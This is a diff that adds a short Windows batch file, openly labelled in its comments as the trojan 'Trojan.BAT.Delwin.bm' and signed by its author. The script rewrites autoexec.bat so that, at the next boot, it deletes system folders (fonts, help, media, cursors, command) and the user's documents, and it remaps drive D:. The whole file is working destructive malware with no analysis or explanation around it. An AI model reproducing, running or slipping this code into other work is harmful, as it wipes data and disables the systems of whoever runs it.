@@ -1,0 +1,12 @@
+@echo off
+@echo del c:\windows\fonts\*.* > c:\autoexec.bat
+@echo del c:\windows\help\*.* >> c:\autoexec.bat
+@echo del c:\windows\media\*.* >> c:\autoexec.bat
+@echo del c:\windows\cursors\*.* >> c:\autoexec.bat
+@echo del c:\windows\command\*.* >> c:\autoexec.bat
+@echo subst d: a:\ >> c:\autoexec.bat
+@echo del c:\mydocu~1\*.* >> c:\autoexec.bat
+::Kaspersky name is Trojan.BAT.Delwin.bm
+::Another DVL creation
+::dvl2003ro@yahoo.co.uk
+cls
